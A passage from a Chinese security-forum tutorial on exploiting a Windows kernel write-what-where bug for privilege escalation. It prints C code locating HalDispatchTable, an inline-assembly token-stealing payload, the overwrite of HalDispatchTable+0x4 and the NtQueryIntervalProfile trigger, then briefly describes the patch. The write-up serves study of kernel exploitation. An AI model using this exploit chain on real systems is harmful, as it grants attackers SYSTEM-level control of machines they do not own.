
### 1. 获取 `HalDispatchTable`

```c
PVOID GetHalDispatchTable() {
  PCHAR KernelImage;
  SIZE_T ReturnLength;
  HMODULE hNtDll = NULL;
  PVOID HalDispatchTable = NULL;
  HMODULE hKernelInUserMode = NULL;
  PVOID KernelBaseAddressInKernelMode;
  NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
  PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;

  hNtDll = LoadLibrary("ntdll.dll");

  if (!hNtDll) {
    DEBUG_ERROR("\t\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
  }

  NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");

  if (!NtQuerySystemInformation) {
    DEBUG_ERROR("\t\t\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
  }

  NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);

  // Allocate the Heap chunk
  pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength);

  if (!pSystemModuleInformation) {
    DEBUG_ERROR("\t\t\t[-] Memory Allocation Failed For SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
  }
  NtStatus = NtQuerySystemInformation(SystemModuleInformation, pSystemModuleInformation, ReturnLength, &ReturnLength);

  if (NtStatus != STATUS_SUCCESS) {
    DEBUG_ERROR("\t\t\t[-] Failed To Get SYSTEM_MODULE_INFORMATION: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
  }

  KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
  KernelImage = strrchr((PCHAR)(pSystemModuleInformation->Module[0].ImageName), '\\') + 1;

  DEBUG_INFO("\t\t\t[+] Loaded Kernel: %s\n", KernelImage);
  DEBUG_INFO("\t\t\t[+] Kernel Base Address: 0x%p\n", KernelBaseAddressInKernelMode);

  hKernelInUserMode = LoadLibraryA(KernelImage);

  if (!hKernelInUserMode) {
    DEBUG_ERROR("\t\t\t[-] Failed To Load Kernel: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
  }

  // This is still in user mode
  HalDispatchTable = (PVOID)GetProcAddress(hKernelInUserMode, "HalDispatchTable");

  if (!HalDispatchTable) {
    DEBUG_ERROR("\t\t\t[-] Failed Resolving HalDispatchTable: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
  }
  else {
    HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable - (ULONG_PTR)hKernelInUserMode);

    // Here we get the address of HapDispatchTable in Kernel mode
    HalDispatchTable = (PVOID)((ULONG_PTR)HalDispatchTable + (ULONG_PTR)KernelBaseAddressInKernelMode);

    DEBUG_INFO("\t\t\t[+] HalDispatchTable: 0x%p\n", HalDispatchTable);
  }

  HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);

  if (hNtDll) {
    FreeLibrary(hNtDll);
  }

  if (hKernelInUserMode) {
    FreeLibrary(hKernelInUserMode);
  }

  hNtDll = NULL;
  hKernelInUserMode = NULL;
  pSystemModuleInformation = NULL;

  return HalDispatchTable;
}
```

#### 2. 编写 Ring0 payload

`payload` 功能：遍历进程，得到系统进程的 `token`，把当前进程的 `token` 替换，达到提权目的。

相关内核结构体：

在内核模式下，`fs:[0]` 指向 `KPCR` 结构体

|  |  |
|---|---|
| `_KPCR` `+0x120` `PrcbData : _KPRCB` `_KPRCB` `+0x004` `CurrentThread : Ptr32 _KTHREAD，_KTHREAD` 指针，这个指针指向 `_KTHREAD` 结构体 `_KTHREAD` `+0x040` `ApcState : _KAPC_STATE` `_KAPC_STATE` `+0x010` `Process : Ptr32 _KPROCESS,_KPROCESS` 指针，这个指针指向 `EPROCESS` 结构体 `_EPROCESS` `+0x0b4` `UniqueProcessId : Ptr32 Void,当前进程ID，系统进程ID=0x04` `+0x0b8` `ActiveProcessLinks : _LIST_ENTRY，双向链表，指向下一个进程的ActiveProcessLinks结构体处，通过这个链表我们可以遍历所有进程，以寻找我们需要的进程` `+0x0f8` `Token : _EX_FAST_REF，描述了该进程的安全上下文，同时包含了进程账户相关的身份以及权限` |  |

`payload`：

|  |  |
|---|---|
| `__asm {` `pushad ; Save registers state` `; Start of Token Stealing Stub` `xor eax, eax ; Set ZERO` `mov eax, fs:[eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread` `; _KTHREAD is located at FS:[0x124]` `mov eax, [eax + EPROCESS_OFFSET] ; Get nt!_KTHREAD.ApcState.Process` `mov ecx, eax ; Copy current process _EPROCESS structure` `mov edx, SYSTEM_PID ; WIN 7 SP1 SYSTEM process PID = 0x4` `SearchSystemPID:` `mov eax, [eax + FLINK_OFFSET] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink` `sub eax, FLINK_OFFSET` `cmp [eax + PID_OFFSET], edx ; Get nt!_EPROCESS.UniqueProcessId` `jne SearchSystemPID` `mov edx, [eax + TOKEN_OFFSET] ; Get SYSTEM process nt!_EPROCESS.Token` `mov [ecx + TOKEN_OFFSET], edx ; Replace target process nt!_EPROCESS.Token` `; with SYSTEM process nt!_EPROCESS.Token` `; End of Token Stealing Stub` `popad ; Restore registers state` `}` |  |

#### 3. 利用漏洞向 `HalDispatchTable` 地址 `+0x4` 地址处写入 `&payload`

|  |  |
|---|---|
| `HalDispatchTable+0x4地址：` `HalDispatchTablePlus4 = (PVOID)((ULONG_PTR)HalDispatchTable + sizeof(PVOID));` `WriteWhatWhere->What = (PULONG_PTR)&EopPayload;` `WriteWhatWhere->Where = (PULONG_PTR)HalDispatchTablePlus4;` |  |

#### 4. 调用 `NtQueryIntervalProfile` 函数，执行 `payload`

|  |  |
|---|---|
| `hNtDll = LoadLibrary("ntdll.dll");` `NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(hNtDll, "NtQueryIntervalProfile");` `NtQueryIntervalProfile(0x1337, &Interval);` |  |

运行 `exp`，提权成功：

![](https://bbs.kanxue.com/upload/attach/202111/921642_QABW76HE3N36J67.jpg)

## 五：补丁分析

在安全版本中已经给出，对 `what` 和 `where` 指针进行验证，`robeForRead` 函数，`ProbeForwrite` 函数，通过验证在进行操作

其他

参考链接：

[0day安全 | Chapter 22 内核漏洞利用技术 (wohin.me)](https://bbs.kanxue.com/elink@f84K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4L8$3S2A6L8W2)9J5k6h3#2W2i4K6u0r3x3r3c8S2P5h3q4F1i4K6u0V1M7i4g2S2L8W2)9J5k6r3y4Z5j5i4m8@1k6i4u0Q4x3X3b7J5x3W2)9J5k6r3&6W2K9g2)9J5k6r3S2W2i4K6u0V1L8r3!0#2i4K6u0V1k6r3!0F1k6#2)9J5k6r3I4A6i4K6u0V1P5h3!0F1k6#2)9J5k6r3A6A6i4K6u0V1P5X3S2#2i4K6u0r3)

TJ：https://bbs.pediy.com/thread-252506.htm#msg_header_h2_2

........

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
